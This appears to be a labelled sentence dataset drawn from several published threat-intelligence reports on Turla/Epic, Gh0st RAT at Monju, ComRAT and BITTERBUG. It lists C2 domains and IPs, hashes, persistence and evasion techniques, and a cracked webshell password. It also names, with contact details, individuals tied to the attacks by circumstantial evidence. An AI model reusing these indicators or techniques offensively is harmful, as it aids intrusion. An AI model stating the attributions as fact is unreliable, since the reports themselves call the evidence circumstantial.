We were able to get a copy of one of the motherships , which provided some insight into the operation .	0
It runs a control panel which is password protected : Once logged into the Control panel , the attackers can see a general overview of the system including the number of interesting potential targets : A very interesting file on the servers is task.css , where the attackers define the IP ranges they are interested in .	1
To change the file , they are using the '' Task editor '' from the menu .	0
Depending on the '' tasks '' , they will decide whether to infect the visitors or not .	1
In this case , we found they targeted two ranges belonging to : It should be noted though , the fact that the attackers were targeting these ranges does n't necessarily mean they also got infected .	1
Some other unknown IPs were also observed in the targeting schedules .	0
There is also an '' except.css '' file where attackers log the reasons they did n't try to exploit certain visitors .	0
There are three possible values : These are the '' do n't meet the conditions '' reasons observed in the logs : For this first stage of the attack , the threat actor uses a custom backdoor .	1
In some cases , the backdoor is packaged together with the CVE-2013-5065 EoP exploit and heavily obfuscated .	1
This makes the analysis more difficult .	0
The CVE-2013-5065 exploit allows the backdoor to achieve administrator privileges on the system and run unrestricted .	1
This exploit only works on unpatched Microsoft Windows XP systems .	0
Other known detection names for the backdoor is Trojan.Wipbot ( Symantec ) or Tavdig .	0
The main backdoor is about 60KB in size and implements a C & C protocol on top of normal HTTP requests .	1
The communication protocol uses requests in the C & C replies , which the malware decrypts and processes .	1
The replies are sent back to the C & C through the same channel .	1
The malware behavior is defined by a configuration block .	0
The configuration block usually contains two hard-coded C & C URLs .	0
He have also seen one case where the configuration block contains just one URL .	0
The configuration can also be updated on the fly by the attackers , via the C & C .	1
The backdoor attempts to identify the following processes and , if found , it will terminate itself : It contains an internal unique ID , which is used to identify the victim to the C & C .	1
Most samples , especially old ones , have the ID 1156fd22-3443-4344-c4ffff .	0
Once a victim is confirmed as '' interesting '' , the attackers upload another Epic backdoor which has a unique ID used to control this specific victim .	1
During the first C & C call , the backdoor sends a pack with the victim 's system information .	1
All further information sent to the C & C is encrypted with a public key framework , making decryption impossible .	1
The commands from the C & C are encrypted in a simpler manner and can be decrypted if intercepted because the secret key is hardcoded in the malware .	1
Through monitoring , we were able to capture a large amount of commands sent to the victims by the attackers , providing an unique view into this operation .	1
Here 's a look at one of the encrypted server replies : Once a victim is infected and '' checks in '' with the server , the attackers send a template of commands : Next , the attackers try to move through the victim 's network using pre-defined or collected passwords : Listing all .doc	1
files recursively is also a common '' theme '' : In total , we have decoded several hundreds of these command packages delivered to the victims , providing an unique insight into the inner workings of the attackers .	0
In addition to generic searches , some very specific lookups have been observed as well .	0
These include searches for : In this case , the attackers were interested to find e-mails related to '' NATO '' , '' Energy Dialogue within European Unition '' and so on .	1
For some of the C & C servers , the attackers implemented RSA encryption for the C & C logs , which makes it impossible to decrypt them .	1
This scheme was implemented in April 2014 .	0
Once a victim is compromised , the attackers upload several tools that are used for lateral movement .	1
One such tool observed in the attacks and saved as '' C : \Documents and Settings\All users\Start Menu\Programs\Startup\winsvclg.exe '' is : This is a keylogger tool that creates % temp % \~DFD3O8.tmp .	1
Note : the filename can change across victims .	0
On one Central Asian government 's Ministry of Foreign Affairs victim system , the filename used was '' adobe32updt.exe '' .	0
In addition to these custom tools , we observed the usage of standard administration utilities .	0
For instance , another tool often uploaded by the attackers to the victim 's machine is '' winrs.exe '' : This is an UPX packed binary , which contains the genuine '' dnsquery.exe '' tool from Microsoft , unpacked MD5 : c0c03b71684eb0545ef9182f5f9928ca .	1
In several cases , an interesting update has been observed -- a malware from a different , yet related family .	0
This backdoor is more sophisticated and belongs to the next level of cyber-espionage tools called the '' Carbon system '' or Cobra by the Turla attackers .	1
Several plugins for the '' Carbon system '' are known to exist .	0
Note : the command and control servers www.losguayaberos [ .	0
] com and thebesttothbrushes [ .	0
] com have been sinkholed by Kaspersky Lab .	0
Other packages delivered to the victims include : These top level packages deploy both updated Epic backdoors and Turla Carbon system backdoors to confirmed victims , effectively linking the Epic and Turla Carbon operations together .	1
The Turla Carbon dropper from these packages has the following properties : This is called internally by the authors '' Carbon System '' , part of the '' Cobra '' project , as it can be seen from the debug path inside : This acts as a dropper for the following modules , both 32 and 64 bit : The Carbon system is in essence an extensible platform , very similar to other attack platforms such as the Tilded platform or the Flame platform .	1
The plugins for the Carbon system can be easily recognized as they always feature at least two exports named : Several Epic backdoors appear to have been designed to work as Carbon system plugins as well - they require a specialized loader to start in victim systems that do not have the Carbon system deployed .	0
Some modules have artifacts which indicate the Carbon system is already at version 3.x , although the exact Carbon system version is very rarely seen in samples : The author of the Carbon module above can be also seen in the code , as '' gilg '' , which also authored several other Turla modules .	0
We are planning to cover the Turla Carbon system with more details in a future report .	0
The payload recovered from one of the mothership servers ( at newsforum.servehttp [ .	1
] com/wordpress/wp-includes/css/img/upload.php , MD5 : 4dc22c1695d1f275c3b6e503a1b171f5 , Compiled : Thu Sep 06 14:09:55 2012 ) contains two modules , a loader/injector and a backdoor .	1
Internally , the backdoor is named '' Zagruzchick.dll '' : The word '' Zagruzchick '' means '' boot loader '' in Russian .	0
The Control panel for the Epic motherships also sets the language to codepage '' 1251 '' : Codepage 1251 is commonly used to render Cyrillic characters .	0
There are other indications that the attackers are not native English language speakers : The sample e9580b6b13822090db018c320e80865f that was delivered to several Epic victims as an upgraded backdoor , has the compilation code page language set to '' LANGRUSSIAN '' .	1
The threat actor behind the '' Epic '' operation uses mainly hacked servers to host their proxies .	0
The hacked servers are controlled through the use of a PHP webshell .	0
This shell is password protected ; the password is checked against an MD5 hash : The MD5 '' af3e8be26c63c4dd066935629cf9bac8 '' has been solved by Kaspersky Lab as the password '' kenpachi '' .	0
In February 2014 we observed the Miniduke threat actor using the same backdoor on their hacked servers , although using a much stronger password .	1
Once again , it is also interesting to point out the usage of Codepage 1251 in the webshell , which is used to render Cyrillic characters .	0
There appears to be several links between Turla and Miniduke , but we will leave that for a future blogpost .	0
On some of the C & C servers used in the Epic attacks , we were able to identify detailed victim statistics , which were saved for debugging purposes by the attackers .	1
This is the country distribution for the top 20 affected countries by victim 's IP : According to the public information available for the victims ' IPs , targets of '' Epic '' belong to the following categories : When G-Data published their Turla paper , there were few details publicly available on how victims get infected with this malware campaign .	0
Our analysis indicates this is a sophisticated multi-stage infection ; which begins with Epic Turla .	0
This is used to gain a foothold and validate the high profile victim .	1
If the victim is interesting , they get upgraded to the Turla Carbon system .	1
Most recently , we observed this attack against a Kaspersky Lab user on August 5 , 2014 , indicating the operation remains fresh and ongoing .	0
Note : A full analysis of the Epic attacks is available to the Kaspersky Intelligent Services customers .	0
Context Information Security distribute Context Threat Intelligence ( CTI ) reporting under the Traffic Light Protocol ( TLP ) , a method of classifying a document in order to promote the distribution of sensitive information between individuals , organisations or communities in a controlled and trusted way , based on the originator 's wishes .	0
The various levels of the TLP are represented by the following colours : Sources may use TLP : RED when information can not be effectively acted upon by additional parties , and could lead to impacts on a party 's privacy , reputation , or operations if misused .	0
Recipients may not share TLP : RED information with any parties outside of the specific exchange , meeting , or conversation in which it is originally disclosed .	0
TLP : RED information will be passed verbally or in person .	0
Sources may use TLP : AMBER when information requires support to be effectively acted upon , but carries risks to privacy , reputation , or operations if shared outside of the organisations involved .	0
Recipients may only share TLP : AMBER information with members of their own organisation who need to know , and only as widely as necessary to act on that information .	0
Sources may use TLP : GREEN when information is useful for the awareness of all participating organisations as well as with peers within the broader community or sector .	0
Recipients may share TLP : GREEN information with peers and partner organisations within their sector or community , but not via publicly accessible channels such as publication or posting publicly on the Internet .	0
Sources may use TLP : WHITE when information carries minimal or no foreseeable risk of misuse , in accordance with applicable rules and procedures for public release .	0
Subject to standard copyright rules , TLP : WHITE information may be distributed freely , without restriction .	0
On 2nd January 2014 a Systems Administrator at the Monju fast breeder reactor facility in Japan noticed suspicious connections emanating from a machine in the control room , coinciding with what was a seemingly routine software update to a free media player .	0
Among other items , staff training documents and more than 40,000 emails were stored on the machine and thought to be harvested by the attacker .	1
The Japanese Atomic Energy Agency is investigating further .	0
The attack appears to have been the result of the attackers having compromised the 'GOM Player ' update server and having it act as a 'watering hole ' , meaning that machines which access the site are delivered malware .	1
Gom Player originates in South Korea and in some parts of Asia it is a popular alternative to Windows Media Player .	0
It is unclear whether every machine trying to download an update received this malware or whether only machines which fitted a certain profile were infected .	0
Technical analysis of the implant on the compromised machine has shown it to be a variant of a Trojan which has been in the wild for some years now and continues to be effective .	1
The 'Gh0st RAT ' has been used extensively in attacks linked to the Chinese state , though it is important to remember that the code is publicly available and can be modified and used by anyone .	0
The targeting of a Japanese nuclear facility however , is consistent with Chinese state intelligence requirements .	0
If this is the work of a Chinese group then we feel the targeting may go much further than the Civil Nuclear sector and thus be of interest to the wider Energy Sector and industry as a whole .	0
In order to inform the Energy Sector and beyond about this attack , we have compiled a technical summary of the attack and have provided a number of Indicators Of Compromise ( IOCs ) which can be used to aid detection .	0
It is likely that the attackers would redeploy their implant against other targets , albeit with a delivery mechanism more tailored to the location of the intended victims .	0
Based on open source reporting , it appears that the intrusion took place via the compromise of the GOM Player update server ( app.gomlab.com ) , where attackers may have gained entry via a PHP-based webshell , hidden within an image , present on the host since October 2011 .	1
The observed malicious activity relates to the modification of a file that controls GOM Player updates , spanning the date range 27th December 2013 to 16th January 2014 , during which time these alterations are reported to have only manifested themselves for visitors on certain IP ranges ; evidence supporting this claim has not yet been made public .	1
If this was indeed the case , then the nature of this attack is certainly more targeted than one that would cover the entire userbase of the GOM Player product , with victims comprising of the Japanese Government in addition to those at the Monju nuclear facility .	0
The modified file redirected the GOM Player update process to another compromised server ( www.fudousankaitori.jp ( 203.189.101.35 ) ) , where a file containing both the legitimate update and the malware was deliver to the victim .	1
Deployed to the system via a compressed bundle containing the official GOM Player setup binary and a self-extracting RAR archive containing the malicious files , the malware consists of a number of individual pieces .	1
Upon extraction from the RAR archive , the installer component ( 0ae82fd94836815a1e8d284ccb75109d ) is automatically launched alongside the GOM Player update , distracting victims from the malicious activity taking place .	1
The installer component is referred to by the author as 'miansha ' which , according to an East Asia Cyber Threat Intelligence Researcher , is likely Miǎnshā ( 免杀 ) , a phrase commonly used by People 's Republic of China ( PRC ) hackers to mean 'anti Antivirus detection ' or 'Antivirus avoidance ' ; Symantec have named the detection for this code 'Backdoor.Miancha ' , where Miǎnchá ( 免查 , likely shorthand for 免杀查 ) similarly means 'Antivirus avoidance ' .	1
The installer is responsible for the malware persistence mechanism , adding entries to the registry in the following locations , depending on Windows Version : The installer will also determine the system architecture ( 32- or 64-bit ) and then deobfuscate the relevant loader DLL to the path 'C : \Windows\temp\install.ocx ' , ensuring the malware is launched on system start-up .	1
Oddly , this file is padded with null bytes , resulting in a 25 megabyte file .	0
The main implant code is stored in files named instructions.pdf and instructions64.pdf ; not PDF documents but instead DLLs obfuscated with a one-byte XOR with 0x14 , similar to the malware loader DLLs .	1
The loader , referred to by the malware author as 壳 ( shell ) , reads and deobfuscates the main implant code which then communicates with the attacker-controlled server at testqweasd.tk ( 211.43.220.89 ) on TCP port 443 .	1
The main implant code is referred to as 白加黑 ( 'Black on White ' ) , a term used in the PRC hacking community to denote the act of Antivirus avoidance through the loading of malicious 'black ' code via non-malicious or trusted 'white ' code .	1
This is a practice recently illustrated through the deployment of the PlugX trojan , utilising DLL load order hijacking alongside a signed ( trusted ) executable .	1
Analysis of this malware revealed it to be a variant of the Gh0st RAT , often used by Chinese actors ( including those who are state-motivated or directly state-sponsored ) .	0
This specific variant shows similarities to that used during the VOHO campaign , where Gh0st RAT was spread via watering hole attacks utilising vulnerable websites belonging to financial services and technology companies .	1
Specifically , the initial five bytes of the communications ( often used to denote a campaign or victim ) are 'HTTPS ' , amended from the original 'Gh0st ' ; the same as the traffic produced by the VOHO Gh0st variant .	0
In addition to delivering system-specific details back to the attacker , Gh0st RAT provides the capability to deploy additional malware , enabling the harvesting of sensitive data and enabling the further propagation throughout the infected network .	1
In February 2014 , the experts of the G DATA SecurityLabs published an analysis of Uroburos , the rootkit with Russian roots .	0
We explained that a link exists between Uroburos and the Agent.BTZ malware , which was responsible for '' the most significant breach of U.S. military computers ever .	0
'' Nine months later , after the buzz around Uroburos , aka Snake or Turla , we now identified a new generation of Agent.BTZ .	0
We dubbed it ComRAT and , by now , analyzed two versions of the threat ( v3.25 and v3.26 ) .	0
As reported earlier this year , Agent.BTZ used the same encoding key and the installation log file name as Uroburos .	0
ComRAT , in its version 3.25 , shows the same behavior .	0
Furthermore , the attackers also shared a C & C domain .	1
The latest version of ComRAT known to us ( v3.26 ) uses a new key and does not create the installation log file , in order to complicate the analysis and to disguise the link between the two cases .	1
Another very interesting fact : the attackers use COM Object hijacking , the same persistence mechanism as COMpfun , which we described recently .	1
Taken everything into consideration , the indications we saw during our analyzes lead to the supposition that the group behind Agent.BTZ and Uroburos is still active and is pursuing the Agent.BTZ path once more to improve and change the RAT .	0
The analyzed file is the latest version we identified : v3.26 .	0
The version identification is described in the chapter '' Log files '' .	0
The major difference between this version and the older version ( s ) will be described there .	0
The first task of the malware is to install the file credprov.tlb in % APPDATA % \Microsoft\ .	1
This file is the main payload of the malware .	0
The dropper executes the following command in order to install a second file : The second file is shdocw.tlp .	1
The two files are Microsoft Windows dynamic libraries .	0
To be started during the boot process of the infected machine , the malware creates the following registry key : This registry key is used to associate the library shdocvw.tlp to the object 42aedc87-2188-41fd-b9a3-0c966feabec1 as previously explained in the article about COMpfun .	1
The purpose is to load the library into each and every process executed on the infected system .	1
If the version of the malware is older than 3.26 , the dropper creates an additional file called winview.ocx .	1
We noticed that the file name is still the same as the file name used by Agent.BTZ in the past .	0
The file is xored with the following obfuscation key ( used by both , Uroburos and Agent.BTZ ) : Here is the decoded log file content : We can notice that the malware checks if an older version is installed on the system and if this is the case , the dropper removes the older version .	1
In contrast to this , in our Uroburos analysis , we found out that Uroburos does not install itself in case a version of Agent.BTZ was found on a system .	1
During the startup of the infected machine , the shdocvw.tlp library is loaded into all processes .	1
If the process is explorer.exe , this library will load the other library called credprov.tlb .	1
This library is the real payload .	0
Its features are common for a Remote Administration Tool ( RAT ) : ComRAT 's communication to the command and control server is performed by the browser process and not by explorer.exe in order to avoid being blocked by a firewall on the system or any additional security products .	1
The communication between the processes is performed by named pipe .	1
Two log files are created during the malware execution : mskfp32.ocx and msvcrtd.tlb .	1
If the malware version is older than 3.26 , the xored key is the same as the dropper key .	0
Concerning the version 3.26 , the malware uses a new non-ASCII key .	0
Here is an example of decoded log file for the version 3.26 : We can identify the version of the malware thanks to the PVer flag .	0
The command and control server information is stored in the registry , not in an XML , and encoded : For example , in the analyzed sample the CC is : weather-online.hopto.org .	1
This domain is far from unknown , as it has been mentioned in BAE System 's Uroburos ( aka Snake ) analysis paper as C & C server domain for the Uroburos malware .	0
Another connection between the cases .	0
If the malware version in lower than 3.26 , the XML log file contains the command and control server information : Let us summarize the similarities and differences between Agent.BTZ , Uroburos and ComRAT as far as we can : Some parts of the code are exactly the same ( appears to be copy & paste ) .	1
That is the reason why the sample is detected as Uroburos ( aka Turla ) .	0
The same code was used by Agent.BTZ and also the dll loaded into userland during the Uroburos analysis .	0
Command and control server domains are shared between Uroburos and ComRAT .	1
In version 3.26 , the author changed the key and remove the known file name .	0
This action can be an indication for the developer 's effort to hide this connection .	0
The main difference is the design .	0
Agent.BTZ is a common RAT , a simple library executed on an infected machine .	1
ComRAT is more complex and cleverer .	0
The malware is loaded into each and every process of the infected machine and the main part ( payload ) of the malware is only executed in explorer.exe .	1
Furthermore , the C & C communication blends into the usual browser traffic and the malware communicates to the browser by named pipe .	1
It is by far a more complex userland design than Agent.BTZ .	0
These differences , mainly the more complex design , lead us to give this malware a new name .	0
The analyzed dropper of v3.25 has a compilation date of February 6th 2014 .	0
The more recent dropper of v3.26 , which has all the mentioned changes implemented , reveals a compilation date of January 3rd 2013 .	0
We suspect that this date is spoofed in order to disguise that this is in fact a newer version .	1
This analysis shows that even after the Uroburos publication in February 2014 , the group behind this piece of malware seems to be still active .	0
In any case , the ComRAT developers implemented new mechanisms , changed keys , removed log files to hide their activities and tried to disguise the connections between the RAT ComRAT , the rootkit Uroburos and the RAT Agent.BTZ as much as possible .	0
However , we can still follow the evolution of the malware by comparing the versions .	0
The persistence mechanism discovered in October 2014 makes it possible to intrude into a system in a really discreet manner and we estimate that other actors will use the same persistence mechanism in the near future .	0
We will definitely keep our ears and eyes open and continue analyzing .	0
Cyber Squared Inc. 's ThreatConnect Intelligence Research Team ( TCIRT ) tracks a number of threat groups around the world .	0
Beginning in the summer of 2013 , TCIRT identified a suspected Pakistani-origin threat group .	0
This group was revealed by TCIRT publicly in August 2013 .	0
In the months following the disclosure , we identified new activity .	0
Cyber Squared partnered with experts at FireEye Labs to examine these new observations in an attempt to discover new research and insight into the group and its Operation '' Arachnophobia '' .	0
The following report is a product of collaborative research and threat intelligence sharing between Cyber Squared Inc. 's TCIRT and FireEye Labs .	0
• While we are not conclusively attributing BITTERBUG activity to Tranchulas or a specific Pakistani entity , we can confidently point to many characteristics of a Pakistan-based cyber exploitation effort that is probably directed against Indian targets and/or those who are involved in India-Pakistan issues .	0
• The threat actors utilized a hosting provider that is a Pakistani-based company with subleased VPS space within the U.S. for command and control ( C2 ) .	1
• The customized malware ( BITTERBUG ) used by these threat actors has only been observed hosted on and communicating with two IP addresses operated by a Pakistan-based hosting provider .	1
• Early variants of the BITTERBUG malware had build paths containing the strings '' Tranchulas '' and '' umairaziz27 '' .	0
Tranchulas is the name of a Pakistani security firm ; Umair Aziz is the name of a Tranchulas employee .	0
• Following the release of our blog post highlighting this activity and the malware 's build strings , the threat actors appear to have modified their binary file paths to make them more generic .	0
• Employees at both the Pakistan-based hosting provider and Tranchulas appear within each others ' social networks .	0
On August 2 , 2013 , the TCIRT published the blog '' Where There is Smoke , There is Fire : South Asian Cyber Espionage Heats Up '' in which TCIRT identified custom malware , later dubbed BITTERBUG by FireEye , suspected to be linked to Pakistani-based exploitation activity directed against Indian entities .	0
We found debug path references to '' Tranchulas '' , which is also the name of a Pakistani security company .	0
Tranchulas claims to support '' national level cyber security programs '' and the development of offensive and defensive cyber capabilities .	0
At the time , the incident seemed to be an isolated one for TCIRT , but it was only the beginning .	0
Our suspicions of Tranchulas ' involvement in the activity began to mount , based on a series of events that occurred both before and after the release of our blog post .	0
During the past year , we communicated with Tranchulas and the Pakistan-based hosting provider .	0
Suspicious responses and oddly similar replies received from both companies to our inquiries , as well as anomalies in their email headers , prompted us to research the companies further .	0
Our research revealed : • The C2 hosting provider ( VPSNOC ) has likely been conducting business operations from within Pakistan , subleasing infrastructure from U.S. providers .	0
• VPNSOC and Tranchulas employees have maintained some type of undefined relationship given connections via social media .	0
• Both organizations have employed or are affiliated with personnel who have offensive cyber expertise .	0
• When TCIRT was initially contacted by Tranchulas following our original blog post , they denied any involvement in the activity .	0
Tranchulas maintained that they were being framed , and that they were already aware of the activity prior to both our blog post and our contact .	0
However , inconsistencies in their claims and their responses made such a scenario questionable .	0
TCIRT began tracking a set of activity involving a BITTERBUG variant in May 2013 .	0
To our knowledge this customized malware has only ever been observed hosted on and communicating with two command and control nodes : 199.91.173.43 and 199.91.173.45 .	1
According to Whois records , those IP addresses were registered to a web-hosting firm in Kansas City , Missouri .	0
Based on public records , this organization appears to be a legal entity chartered to conduct business in Missouri .	0
On July 24 , 2013 , TCIRT contacted the Kansas City-based hosting provider to notify them of the malicious activities emanating from IP address 199.91.173.43 .	0
The hosting provider subsequently introduced TCIRT to their client VPNSOC , the customer responsible for subleasing the IP address .	0
Later that day , TCIRT received a response from support @ vpsnoc.com providing limited information on the server and related traffic ( Figure 2 ) .	0
When TCIRT sent follow-up communications , VPSNOC did not respond , further increasing our suspicions .	0
While reviewing the metadata of VPSNOC 's July 24 , 2013 email response , we noticed the email was sent from a +0500 time zone .	0
This time zone usage is consistent with Pakistan 's time zone .	0
The TCIRT published details of the initial activity in the aforementioned blog post on August 2 , 2013 .	0
Four days later on August , 2013 , the Tranchulas Chief Executive Officer , Zubair Khan , contacted us regarding the blog post and its subsequent press coverage .	0
Khan submitted '' ResponseThreatConnect.docx '' as an explanation of the observed activity to both the media and the TCIRT indicating that the debug paths using '' Tranchulas '' and '' umairaziz27 '' was '' done by developer of malware to portray wrong impression about Tranchulas and mislead malware analysts '' .	0
Notably , Khan included a screenshot of an email message .	0
The message was reportedly a response from VPSNOC to an email message from Tranchulas sent on July 21 , 2013 , purportedly to notify VPSNOC of the same malicious activity identified by TCIRT .	0
However , we noted certain anomalies in this message .	0
As seen in Figure 3 the '' email message '' was '' sent '' to VPSNOC from an unidentified tranchulas.com email address on '' Tue , Jul 21 , 2013 at 11:36 PM .	0
'' July 21 , 2013 was not a Tuesday and in fact was a Sunday .	0
The mismatched date suggests that this email message was potentially modified in order to support the claim that Tranchulas was aware of , and had already reported the exploitation activity .	0
TCIRT speculates that '' Tuesday '' was hastily chosen because our own official notification to VPSNOC was sent on Wednesday the 24th .	0
In addition , the '' response '' received by Tranchulas is nearly identical to that received by TCIRT .	0
We believe that Tranchulas may have obtained information about TCIRT 's notification to VPSNOC through a pre-established relationship .	0
The TCIRT responded to Mr. Khan 's official explanation with a follow-up inquiry , offering Khan an opportunity to explain the notable date inconsistency within the email screenshot .	0
The TCIRT also requested that Mr. Khan share the actual email message with the original attached headers .	0
Mr. Khan did not address the TCIRT question , but rather deferred our request to Mr. Hamza Qamar , a Penetration Testing Team Lead at Tranchulas .	0
On August 15 , 2013 , three days later , Qamar responded to TCIRT with a brief denial of any modifications to the screenshot ( other than email address anonymization ) and specifically referred TCIRT back to VPSNOC support ( support @ vpsnoc.com ) for any follow up questions .	0
Astonished by this dismissal and deflection , TCIRT immediately began to explore the relationship between VPSNOC and Tranchulas .	0
During our research into VPSNOC , we identified that it is actually based in , or conducts partial operations from within , Pakistan .	0
The company only gives the impression of operating from Kansas City through marketing and the use of leased IP space ( Figure 4 ) .	0
The Whois records for vpsnoc.com revealed that the domain was registered by Digital Linx Hosting .	0
Digital Linx is also a Pakistan-based hosting company ( Figure 5 ) .	0
As seen in Figure 6 , the administrative email address is admin @ digitallinx.org .	0
This is the same registrant record for the digitallinx.net domain .	0
The domains digitillinx.org , digitallinx.net , and digitallinx.com share current and historical similarities in their WHOIS records and sitemap.xml files that imply they are all controlled by the same individual or entity .	0
The domain digitallinx.com is registered to Muhammad Naseer Bhatti ( Digital Linx Founder ) who uses email addresses naseer @ digitallinx.com and nbhatti @ gmail.com .	0
The domain is also registered to the address 638-F Johar Town , Lahore Pakistan .	0
The contact telephone number listed on Digital Linx ' web site is 925-665-1427 ( Figure 6 ) , and is also used in the WHOIS record for defiantmarketing.com .	0
The domain defiantmarketing.com is registered to Abunasar Khan .	0
The registration lists VPSNOC as the registrant organization , abunasar @ yahoo.com as the registration email address , and House 12 , Street 21 , F-8/1 Islamabad Federal 44000 as the registration address .	0
Abunasar Khan has been observed using the aliases '' agnosticon '' and '' agnostic '' .	0
From this we were able to locate an advertisement in the Blackhatworld forum from April 2012 posted by agnosticon promoting VPSNOC and identifying it as a subdivision of Digital Linx Hosting ( Figure 7 ) .	0
Though none of this information is surprising , it further suggests that both Bhatti and Abunasar Khan work or worked for Digital Linx and VPSNOC and during that time were both located in Pakistan .	0
Additional research into Abunasar Khan identified several registered domains and fragments of his online presence .	0
Based on his websites and account information , he appears to have an interest or participated in the Antisec and Anonymous movements ( Figure 8 ) .	0
He also used '' anony mo us '' in the registration name field of a personal account .	0
In addition , Abunasar Khan 's Google+ profile revealed connections to at least one Tranchulas employee , Hamza Qamar and a Digital Linx employee , Shoaib Riaz .	0
Hamza Qamar , the Team Lead for Penetration Testing at Tranchulas , with whom TCIRT last spoke .	0
Visiting Hamza Qamar 's Google+ page ( Figure 9 ) , the only directly connected person was Abunasar Khan .	0
At this point , it shows that a probable VPNSOC employee with ties or interests in hacking has an undefined but potentially close relationship with Hamza Qamar , the Penetration Testing employee from Tranchulas .	0
Qamar indicated on his public LinkedIn profile that he '' engaged in system and enterprise level network and Web application security testing for clients ranging from large federal agencies , DoD , and commercial clients '' , though it is unclear which '' DoD '' is referenced ( e.g. , whether the Pakistani Ministry of Defense or some other nation 's defense department ) .	0
Tranchulas identifies government ( presumably Pakistan 's government ) as an operational sector for its work .	0
Tranchulas ' offensive cyber initiative services are offered to '' national-level cyber security programs '' indicating commercial demand from '' national-level '' customers .	0
Though Tranchulas brands itself as a multi-national company , with respective addresses within the United Kingdom , the United States , and New Zealand .	0
We found evidence that these addresses are all associated with either virtual office spaces or address forwarding services .	0
For further background information on these personas , please see Appendix F : Personas .	0
The following is a summary of the relationships between the hosting organizations and Tranchulas : • VPNSOC IP space was used as command and control nodes for attackers using variants of the BITTERBUG malware that contained build strings that referenced '' Tranchulas '' and a Tranchulas employee .	1
• Tranchulas and VPNSOC were in direct communication at some point in July-August 2013 .	0
• VPNSOC is a subsidiary of Digital Linx .	0
• Tranchulas , VPNSOC , Digital Linx were all physically located in Pakistan but maintained virtual presence within the U.S. • Hamza Qamar was an employee of Tranchulas .	0
• Muhammad Naseer Bhatti was the self-proclaimed founder of Digital Linx .	0
• Abunasar Khan was affiliated with AntiSec and VPNSOC .	0
• Digital Linx founder Muhammad Naseer Bhatti had at least a working relationship with VPNSOC employee Abunasar Khan – connected through domain registrations and a common Google+ profile for Shoaib Riaz ( another Digital Linx employee ) .	0
• VPNSOC employee Abunasar Khan had a direct connection to Tranchulas employee Hamza Qamar through Google+ .	0
Note : A walkthrough of our research is available in Appendices C , D and E. Metadata Analysis : As mentioned earlier , during the email exchanged with Zubair Khan , he sent TCIRT a Microsoft Word document ( .docx	0
) .	0
In reviewing the document metadata for '' ResponseThreatConnect.docx '' , TCIRT identified that it contained the creator properties of '' hp .	0
'' TCIRT compared the metadata of two benign BITTERBUG-associated decoy documents from July 2013 and found that both also had the author of '' hp '' ( Figure 10 ) .	0
While the author field of '' hp '' does n't conclusively prove a relationship , it contributes to the body of circumstantial evidence which links properties of the official Tranchulas response to the properties of decoy documents that were used in conjunction with BITTERBUG targeting campaigns .	1
CyberSquared Inc. partnered with FireEye for a second technical review of the malware associated with this activity .	0
FireEye analyzed the malware , which they call BITTERBUG , and determined it to be a custom backdoor .	1
The backdoor relies on various support components , including the non-malicious , publically available Libcurl for installation , launch , and communications .	1
In some variants , BITTERBUG has the ability to automatically target and exfiltrate files with extensions such as .doc , .xls , .pdf , .ppt , .egm , and .xml	1
.	0
The full malware report is included in Appendix A : Malware Details .	0
The earliest evidence of the malware family dates to April 2013 , based on the Portable Executable ( PE ) compile times , with more than 10 BITTERBUG variants observed to date .	0
The earliest samples of BITTERBUG contain the '' Tranchulas '' debug path ( below ) , as mentioned in the August 2013 TCIRT blog post .	0
These BITTERBUG variants were probably used in attacks around summer 2013 , using possible lures related to the then-recent death of '' Sarabjit Singh '' ( an Indian national imprisoned in Pakistan ) and an Indian Government pension memorandum .	0
As stated in the original blog ( and raised in the formal Tranchulas response ) , several binaries contain references to '' Cath '' in the debug path .	0
It is important to note that the '' Cath '' files are support components and not BITTERBUG variants , so it is probable that these were developed by another party but are a required component of the family .	0
Additional BITTERBUG variants were compiled in June and July 2013 that contained different identifiers in the debug paths : '' Cert-India '' ( 3 samples ) and '' umairaziz27 '' ( 1 sample ) .	0
The presence of '' umairaziz27 '' in a debug path from one sample makes us wonder if this represents an operational security mistake .	0
The debug path of '' umairaziz27 '' led us to Twitter and LinkedIn accounts ( on which a matching alias is used ) that belong to a Tranchulas employee named Umair Aziz , who identified himself as an Information Security Analyst and graduate of National University of Sciences and Technology ( NUST ) .	0
One of these samples was probably used in attacks in late summer 2013 , using a '' leaked report '' lure which contained a decoy document related to Pakistan 's alleged inability to locate Osama Bin Laden .	1
After publication of the TCIRT blog and our communications with Tranchulas occurred in August 2013 , no new samples of BITTERBUG or its support components ( based on compile times ) were identified until September ( various support components ) and October ( a new BITTERBUG variant ) .	0
Interestingly , the samples compiled following the blog publication used entirely new and generic debug paths ( Figure 11 ) as well as a compilation tactic to conceal the C2 address from static analysis .	1
Between September and December , we observed more variations of BITTERBUG and its support components in terms of packaging , host-based activities , and decoys ( or the lack of them ) compared to the samples before our blog post .	0
This could indicate that the threat actors were aware of the blog post and modified their malware and related components to distance them from prior indicators .	0
Between December 2013 and late March 2014 , we observed several new lures used in BITTERBUG self-extracting RAR ( SFXRAR ) files .	1
One from December contained several BITTERBUG variants and used a decoy PDF document ( Figure 12 ) related to the December arrest of Devyani Khobragade , an Indian diplomat in the United States .	1
In spring 2014 , we observed a SFXRAR file with a filename lure related to the March 2014 disappearance of Malaysis Airlines Flight 370 ( cast as a Pakistan-related hijacking ) .	1
This SFXRAR contained the latest BITTERBUG variant , which had new dependencies on support components .	0
Interestingly , this SFXRAR 's filename was the only lure element related to the MH370 event ; it did not contain a decoy document .	1
We provide a more detailed report on this SFX and the related variant in Appendix A : Malware Details .	0
BITTERBUG continued to rely on the same network behaviors to communicate with its C2s .	1
Connections to its C2 nodes relied on PHP and used communications that included '' .php ? compname= '' and '' .php ? srs= '' , as well as direct file/component retrieval from the C2s .	1
Though many of the samples that we have observed use direct IPs for HTTP communications , we have observed more limited use of a No-IP domain .	1
Operation Arachnophobia consists of an apparent targeted exploitation campaign , dating back to early 2013 , using the BITTERBUG malware family and seemingly directed against entities involved in India-Pakistan issues .	0
The threat actor appears to have exclusively used VPSNOC , a probable Pakistan-based VPS service provider who leased U.S. hosting services , for both the delivery and C2 phases of attack .	1
Research later identified that a Pakistan-based VPSNOC representative had a social network affiliation with a Tranchulas employee as well as apparent affiliations with the Anonymous and AntiSec movements .	0
After the August 6 , 2013 blog , Tranchulas provided TCIRT and the media an official statement and explanation of BITTERBUG activity , however , this explanation contained discrepancies .	0
The TCIRT addressed some of these discrepancies with Tranchulas personnel , who were unresponsive , increasing our suspicion of the activity .	0
We later observed BITTERBUG activity following August 2013 with subtle changes that further generalized debug paths .	0
